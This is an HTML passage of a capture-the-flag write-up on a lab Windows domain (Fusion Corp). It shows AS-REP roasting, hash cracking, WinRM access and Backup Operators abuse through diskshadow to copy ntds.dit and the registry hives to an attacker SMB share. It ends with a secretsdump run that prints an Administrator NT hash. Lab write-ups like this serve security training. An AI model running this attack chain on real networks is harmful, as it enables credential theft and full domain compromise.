+bffc8f0aef2463b3798ad7b41d509ed2dbeb27891489b7a633b438fd0d78232f6b0caea0f2589b2f68d37a6c6f600a5f7ed69a8cb9b4af2e6910b211fc563fe35b2a8877f651295b9b708d7126415
+28f81144b104fc5049d28bc77a0dfdb76dd
+2025/07/10 22:15:02 >  <span class="indicator-success">[+]</span> VALID USERNAME:       lparker@fusion.corp
+2025/07/10 22:15:02 >  Done! Tested 11 usernames (1 valid) in 0.330 seconds</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>All of them are valid users, and kerbrute gives us a hash for the <code>lparker</code> user, meaning they have Kerberos pre-authentication disabled and are vulnerable to an AS-REP Roasting attack. Notice we use <code>--downgrade</code>; that&rsquo;s because by default kerbrute uses encryption type 18 which can be harder to crack, and we downgrade it to etype 23.</p>
+<p>Then we use hashcat to crack this:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">hashcat</span> hash /usr/share/wordlists/rockyou.txt 
+Hash-mode was not specified with <span class="flag">-m</span>. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+$krb5asrep$23$lparker@FUSION.CORP:280401f202e94884688719396e63d9ee$45824f33f2c9c951e628dd9b9f4cc84ab4a695a0d34de4ec9f43e8f99186e513d42f54ba0f07c8c30c0fef6d2c5811e46c3317f884d2e7801f2ec84
+2a4f3d5aca4f3f0515d3d3a5424acc4027920f1443ad757405c72794cf4a2495c83f5358db62a2771985a04019a16f945b9e723c223d9f99bbb6e0e9c9b77563aab0ccf30e69b1e52fa825e184d41e5f7303c54437d66bbc011878176ce3c9e5ba62934b0a5ba9fd4e43a374123dbebcfb067103540c1ab6bfa35383d821a7428b3f3a6e8efeae0a5f2ab8ec814a9ef975836bc0482ea80aabe11fb50d
+9ee1c86933849b9bbf5e15efacc03c6fada:!!abbylvzsvs2k6!
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>We now have a valid credential: <code>lparker:!!abbylvzsvs2k6!</code></p>
+<p>Let&rsquo;s validate this using <code>netexec</code>:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> lparker <span class="flag">-p</span> <span class="string">'!!abbylvzsvs2k6!'</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (<span style="color:red;font-weight:bold">signing:True</span>) (<span style="color:orange;font-weight:bold">SMBv1:False</span>) 
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-success">[+]</span> fusion.corp\lparker:!!abbylvzsvs2k6! 
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-info">[*]</span> Enumerated shares
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="row-header">Share           Permissions     Remark</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="flag">-----</span>           <span class="flag">-----------</span>     <span class="flag">------</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span style="color:orange;font-weight:bold">ADMIN$                          Remote Admin</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span style="color:orange;font-weight:bold">C$                              Default share</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span style="color:orange;font-weight:bold">IPC$            READ            Remote IPC</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span style="color:orange;font-weight:bold">NETLOGON        READ            Logon server share </span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span style="color:orange;font-weight:bold">SYSVOL          READ            Logon server share</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>We do. There&rsquo;s nothing interesting on shares so let&rsquo;s skip that. I then try netexec to see if we can winrm with this user:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> winrm $target <span class="flag">-u</span> lparker <span class="flag">-p</span> <span class="string">'!!abbylvzsvs2k6!'</span>         
+WINRM       10.10.27.194    5985   FUSION-DC        <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.27.194    5985   FUSION-DC        <span class="indicator-success">[+]</span> fusion.corp\lparker:!!abbylvzsvs2k6! <span style="color: orange; font-weight: bold">(Pwn3d!)</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We can, let&rsquo;s try to connect:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> $target <span class="flag">-u</span> lparker <span class="flag">-p</span> <span class="string">'!!abbylvzsvs2k6!'</span>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker\Documents> cd ..
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> tree /f
+Folder PATH listing
+Volume serial number is 82D1-EB4D
+C:.
+ÃÄÄÄDesktop
+³       flag.txt
+³
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+ÃÄÄÄLinks
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÀÄÄÄVideos
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> type desktop\flag.txt
+THM{c105b6fb249741b89432fada8218f4ef}
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Here we found our first flag.</p>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+First flag: THM{c105b6fb249741b89432fada8218f4ef}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h1 id="3-privilege-escalation-ta0004">3. Privilege Escalation (TA0004)<a hidden class="anchor" aria-hidden="true" href="#3-privilege-escalation-ta0004">#</a></h1>
+<h3 id="31-user-enumeration-and-discovery">3.1. User Enumeration and Discovery<a hidden class="anchor" aria-hidden="true" href="#31-user-enumeration-and-discovery">#</a></h3>
+<p>Before running automated tools, I first try basic post-enumeration. I first check what I can do with the system.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> whoami /all
+
+USER INFORMATION
+<span class="flag">----------------</span>
+
+User Name      SID
+============== =============================================
+fusion\lparker S-1-5-21-1898838421-3672757654-990739655-1103
+
+
+GROUP INFORMATION
+<span class="flag">-----------------</span>
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+<span class="flag">----------------------</span>
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+<span class="flag">-----------------------</span>
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>With this privilege, we can&rsquo;t do much. Then I try to list domain users:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> net user
+
+User accounts for \\
+
+<span class="flag">-------------------------------------------------------------------------------</span>
+Administrator            Guest                    jmurphy
+krbtgt                   lparker
+The command completed with one or more errors.
+
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> 
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>The non-default user is <code>jmurphy</code>. Let&rsquo;s check <code>jmurphy</code>&rsquo;s information:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\lparker> net user jmurphy
+User name                    jmurphy
+Full Name                    Joseph Murphy
+Comment                      Password set to u8WC3!kLsgw=#bRY
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            3/3/2021 6:41:24 AM
+Password expires             Never
+Password changeable          3/3/2021 6:41:24 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Backup Operators     *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>I was surprised they put the password in the comment field. Also, <code>jmurphy</code> is part of the <code>Backup Operators</code> group. This means we can backup system files, including the NTDS.DIT database.</p>
+<p>With this information let&rsquo;s log in as <code>jmurphy</code>:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> $target <span class="flag">-u</span> jmurphy <span class="flag">-p</span> <span class="string">'u8WC3!kLsgw=#bRY'</span>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\jmurphy\Documents> cd ..
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\jmurphy> tree /f
+Folder PATH listing
+Volume serial number is 82D1-EB4D
+C:.
+ÃÄÄÄDesktop
+³       flag.txt
+³
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+ÃÄÄÄLinks
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÀÄÄÄVideos
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\jmurphy> type desktop\flag.txt
+THM{b4aee2db2901514e28db4242e047612e}
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Second flag: THM{b4aee2db2901514e28db4242e047612e}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h3 id="32-abusing-backup-operators-t1565001">3.2. Abusing Backup Operators (T1565.001)<a hidden class="anchor" aria-hidden="true" href="#32-abusing-backup-operators-t1565001">#</a></h3>
+<p>Now that we have confirmed the user is part of the <code>Backup Operators</code> group, we can use the Volume Shadow Copy Service (VSS) to create a snapshot of the <code>C:</code> drive. This allows us to access restricted files without needing full SYSTEM access.</p>
+<p>We create a script named <code>evilshadow.txt</code> that contains the following:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cat</span> evilshadow.txt
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% X:
+end backup
+exit
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Then upload the file via winrm. Then we run this command:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> diskshadow /s evilshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  FUSION-DC,  7/10/2025 7:34:05 PM
+
+-> set verbose on
+-> set metadata C:\Windows\Temp\meta.cab
+-> set context clientaccessible
+-> set context persistent
+-> begin backup
+-> add volume C: alias cdrive
+-> create
+Excluding writer <span class="string">"Shadow Copy Optimization Writer"</span>, because all of its components have been excluded.
+Component <span class="string">"\BCD\BCD"</span> from writer <span class="string">"ASR Writer"</span> is excluded from backup,
+because it requires volume  which is not in the shadow copy set.
+The writer <span class="string">"ASR Writer"</span> is now entirely excluded from the backup because the top-level
+non selectable component <span class="string">"\BCD\BCD"</span> is excluded.
+
+* Including writer <span class="string">"Task Scheduler Writer"</span>:
+        + Adding component: \TasksStore
+
+* Including writer <span class="string">"VSS Metadata Store Writer"</span>:
+        + Adding component: \WriterMetadataStore
+
+* Including writer <span class="string">"Performance Counters Writer"</span>:
+        + Adding component: \PerformanceCounters
+
+* Including writer <span class="string">"System Writer"</span>:
+        + Adding component: \System Files
+        + Adding component: \Win32 Services Files
+
+* Including writer <span class="string">"WMI Writer"</span>:
+        + Adding component: \WMI
+
+* Including writer <span class="string">"DFS Replication service writer"</span>:
+        + Adding component: \SYSVOL\3656A825-08E2-4C77-82F0-0F07EC965204-BFD185EF-4D5F-44A5-950B-C2222C20A32C
+
+* Including writer <span class="string">"NTDS"</span>:
+        + Adding component: \C:_Windows_NTDS\ntds
+
+* Including writer <span class="string">"COM+ REGDB Writer"</span>:
+        + Adding component: \COM+ REGDB
+
+* Including writer <span class="string">"Registry Writer"</span>:
+        + Adding component: \Registry
+
+Alias cdrive for shadow ID {ede08349-fbba-4e21-a4aa-7e826a85fdbe} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {87f16f4d-8c8d-4048-ae78-13bd7fca42b9} set as environment variable.
+Inserted file Manifest.xml into .cab file meta.cab
+Inserted file BCDocument.xml into .cab file meta.cab
+Inserted file WM0.xml into .cab file meta.cab
+Inserted file WM1.xml into .cab file meta.cab
+Inserted file WM2.xml into .cab file meta.cab
+Inserted file WM3.xml into .cab file meta.cab
+Inserted file WM4.xml into .cab file meta.cab
+Inserted file WM5.xml into .cab file meta.cab
+Inserted file WM6.xml into .cab file meta.cab
+Inserted file WM7.xml into .cab file meta.cab
+Inserted file WM8.xml into .cab file meta.cab
+Inserted file WM9.xml into .cab file meta.cab
+Inserted file WM10.xml into .cab file meta.cab
+Inserted file Dis3BAE.tmp into .cab file meta.cab
+
+Querying all shadow copies with the shadow copy set ID {87f16f4d-8c8d-4048-ae78-13bd7fca42b9}
+
+        * Shadow copy ID = {ede08349-fbba-4e21-a4aa-7e826a85fdbe}               %cdrive%
+                - Shadow copy set: {87f16f4d-8c8d-4048-ae78-13bd7fca42b9}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 7/10/2025 7:35:10 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: Fusion-DC.fusion.corp
+                - Service machine: Fusion-DC.fusion.corp
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent Differential
+
+Number of shadow copies listed: 1
+-> expose %cdrive% X:
+-> %cdrive% = {ede08349-fbba-4e21-a4aa-7e826a85fdbe}
+The shadow copy was successfully exposed as X:\.
+-> end backup
+-> exit
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>This tells DiskShadow to read and execute the commands from the script file. It creates a shadow copy of the <code>C:</code> drive and prepares it for access. We could do all of this without the <code>.txt</code> file if we had an interactive shell. But since we are using WinRM, which is not interactive in this case, providing a script file is the easiest way to automate the process.</p>
+<p>Now that we already have the snapshot of the <code>C:</code> drive on the <code>X:</code> drive, we can copy the <code>NTDS.DIT</code> from there and save it to a writable directory on <code>C:</code>.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> robocopy /b X:\Windows\ntds .
+
+<span class="flag">-------------------------------------------------------------------------------</span>
+   ROBOCOPY     ::     Robust File Copy for Windows
+<span class="flag">-------------------------------------------------------------------------------</span>
+
+  Started : Thursday, July 10, 2025 7:41:25 PM
+   Source : X:\Windows\ntds\
+     Dest : C:\stuff\
+
+    Files : *.*
+
+  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+<span class="flag">------------------------------------------------------------------------------</span>
+
+...SNIP...
+
+<span class="flag">------------------------------------------------------------------------------</span>
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         8         8         0         0         0         1
+   Bytes :   56.43 m   56.43 m         0         0         0       197
+   Times :   0:00:03   0:00:03                       0:00:00   0:00:00
+
+
+   Speed :            17218215 Bytes/sec.
+   Speed :             985.234 MegaBytes/min.
+   Ended : Thursday, July 10, 2025 7:41:29 PM
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Then we copy <code>SYSTEM</code> and <code>SAM</code> hives:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> reg save HKLM\SYSTEM SYSTEM.SAV
+The operation completed successfully.
+
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> reg save HKLM\SAM SAM.SAV
+The operation completed successfully.
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> dir
+
+
+    Directory: C:\stuff
+
+
+Mode                LastWriteTime         Length Name
+<span class="flag">----</span>                <span class="flag">-------------</span>         <span class="flag">------</span> <span class="flag">----</span>
+<span class="flag">-a----</span>        7/10/2025   7:35 PM           8192 edb.chk
+<span class="flag">-a----</span>        7/10/2025   7:35 PM       10485760 edb.log
+<span class="flag">-a----</span>         3/3/2021   4:43 AM       10485760 edb00001.log
+<span class="flag">-a----</span>         3/3/2021   4:43 AM       10485760 edbres00001.jrs
+<span class="flag">-a----</span>         3/3/2021   4:43 AM       10485760 edbres00002.jrs
+<span class="flag">-a----</span>        7/10/2025   7:33 PM            197 evilshadow.txt
+<span class="flag">-a----</span>        7/10/2025   7:35 PM       16777216 ntds.dit
+<span class="flag">-a----</span>        7/10/2025   7:35 PM          16384 ntds.jfm
+<span class="flag">-a----</span>        7/10/2025   7:44 PM          49152 SAM.SAV
+<span class="flag">-a----</span>        7/10/2025   7:44 PM       18083840 SYSTEM.SAV
+<span class="flag">-a----</span>        7/10/2025   6:50 PM         434176 temp.edb
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Now that we have everything what we need, let&rsquo;s download this via smbserver since downloading this through evil-winrm takes too much time.</p>
+<p>First we setup a passwordless SMB server:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">mkdir</span> share; smbserver.py <span class="flag">-smb2support</span> share share/
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="indicator-info">[*]</span> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Then we copy the files:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> copy SAM.SAV \\10.6.59.160\share
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> copy SYSTEM.SAV \\10.6.59.160\share
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\stuff> copy ntds.dit \\10.6.59.160\share
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Checking the <code>share/</code> directory we created we already have what we need:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ls</span> <span class="flag">-la</span> share/ 
+total 34100
+drwxrwxr-x 2 gen gen     4096 Jul 10 22:47 .
+drwxrwxr-x 5 gen gen     4096 Jul 10 22:46 ..
+<span class="flag">-rwxrwxr-x</span> 1 gen gen 16777216 Jul 10 22:35 ntds.dit
+<span class="flag">-rwxrwxr-x</span> 1 gen gen    49152 Jul 10 22:44 SAM.SAV
+<span class="flag">-rwxrwxr-x</span> 1 gen gen 18083840 Jul 10 22:44 SYSTEM.SAV
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<h3 id="33-dumping-domain-hashes-t1003003">3.3. Dumping Domain Hashes (T1003.003)<a hidden class="anchor" aria-hidden="true" href="#33-dumping-domain-hashes-t1003003">#</a></h3>
+<p>Let&rsquo;s dump the hashes:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">secretsdump.py</span> <span class="flag">-sam</span> SAM.SAV <span class="flag">-system</span> SYSTEM.SAV <span class="flag">-ntds</span> ntds.dit local
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
+<span class="indicator-info">[*]</span> Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
